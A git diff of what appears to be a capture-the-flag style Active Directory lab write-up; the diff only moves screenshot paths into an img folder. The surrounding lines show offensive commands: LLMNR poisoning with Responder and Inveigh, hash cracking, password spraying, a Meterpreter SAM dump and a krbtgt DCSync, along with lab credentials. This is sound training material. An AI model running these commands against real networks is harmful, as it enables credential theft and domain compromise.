@@ -51,7 +51,7 @@ No credentials are provided, so we start by capturing a network authentication. 
 sudo responder -I ens224 -w
 ```
 
-![Responder poisons LLMNR/NBT-NS and captures AB920's NetNTLMv2 hash](02-responder-ab920.png)
+![Responder poisons LLMNR/NBT-NS and captures AB920's NetNTLMv2 hash](img/02-responder-ab920.png)
 
 Captured the NetNTLMv2 hash of **AB920**. Copied it to Kali and cracked it with John:
 
@@ -95,7 +95,7 @@ crackmapexec smb 172.16.7.3 -u AB920 -p 'weasal' --users | awk '{print $5}' > us
 crackmapexec smb 172.16.7.3 -u users.txt -p 'Welcome1' --continue-on-success
 ```
 
-![Password spray with Welcome1 against the user list: BR086 returns a valid login](04-password-spraying.png)
+![Password spray with Welcome1 against the user list: BR086 returns a valid login](img/04-password-spraying.png)
 
 **Credentials obtained:** `BR086:Welcome1` — the user belongs to the **IT Managers** group.
 
@@ -109,7 +109,7 @@ RDP access with BR086 reveals nothing useful. Based on the IT Managers membershi
 smbclient //172.16.7.3/"Department Shares" -U BR086%Welcome1
 ```
 
-![Enumeration of the Department Shares share with BR086's credentials](05-smb-shares.png)
+![Enumeration of the Department Shares share with BR086's credentials](img/05-smb-shares.png)
 
 Retrieved `web.config` from `\IT\Private\Development\`:
 
@@ -125,7 +125,7 @@ The file contains a cleartext MSSQL connection string:
 </connectionStrings>
 ```
 
-![The web.config file exposes the MSSQL connection string with netdb's credentials in cleartext](06-webconfig-netdb.png)
+![The web.config file exposes the MSSQL connection string with netdb's credentials in cleartext](img/06-webconfig-netdb.png)
 
 **Credentials obtained:** `netdb:D@ta_bAse_adm1n!`
 
@@ -149,7 +149,7 @@ load kiwi            # mimikatz extension for Meterpreter
 lsa_dump_sam         # dump the SAM database
 ```
 
-![Meterpreter session opened on SQL01 (172.16.7.60) via the MSSQL payload](07-meterpreter-sql01.png)
+![Meterpreter session opened on SQL01 (172.16.7.60) via the MSSQL payload](img/07-meterpreter-sql01.png)
 
 From the SAM dump, the NTLM hash of SQL01's **local Administrator**:
 
@@ -208,9 +208,9 @@ Import-Module .\Inveigh.ps1
 Invoke-Inveigh -NBNS Y -LLMNR Y -mDNS Y -ConsoleOutput N -FileOutput Y -IP 172.16.7.50
 ```
 
-![Inveigh listening on MS01: LLMNR/NBNS/mDNS poisoning and capture in progress](08a-inveigh-poisoning.png)
+![Inveigh listening on MS01: LLMNR/NBNS/mDNS poisoning and capture in progress](img/08a-inveigh-poisoning.png)
 
-![Reading Inveigh-NTLMv2.txt from the evil-winrm session as Administrator: CT059's hash is present](08b-inveigh-ct059-hash.png)
+![Reading Inveigh-NTLMv2.txt from the evil-winrm session as Administrator: CT059's hash is present](img/08b-inveigh-ct059-hash.png)
 
 Captured the NetNTLMv2 hash of **CT059** and cracked it with John:
 
@@ -218,7 +218,7 @@ Captured the NetNTLMv2 hash of **CT059** and cracked it with John:
 john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ct059_hash.txt
 ```
 
-![John cracks CT059's NetNTLMv2 hash: password charlie1](08c-ct059-cracked.png)
+![John cracks CT059's NetNTLMv2 hash: password charlie1](img/08c-ct059-cracked.png)
 
 **Credentials obtained:** `CT059:charlie1`
 
@@ -253,7 +253,7 @@ With CT059 promoted to Domain Admin, access DC01 from the Parrot session:
 evil-winrm -i 172.16.7.3 -u CT059 -p 'charlie1'
 ```
 
-![Access to DC01 as CT059 (now Domain Admin) and reading the Administrator flag](10-flag-dc01.png)
+![Access to DC01 as CT059 (now Domain Admin) and reading the Administrator flag](img/10-flag-dc01.png)
 
 Retrieved the flag on DC01's Administrator Desktop.
 
@@ -271,7 +271,7 @@ secretsdump.py inlanefreight.local/CT059:'charlie1'@172.16.7.3 -just-dc-user krb
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
 ```
 
-![DCSync of the krbtgt account via secretsdump with CT059's credentials](11-dcsync-krbtgt.png)
+![DCSync of the krbtgt account via secretsdump with CT059's credentials](img/11-dcsync-krbtgt.png)
 
 **krbtgt NTLM hash:** `7eba70412d81c1cd030d72a3e8dbe05f`
 
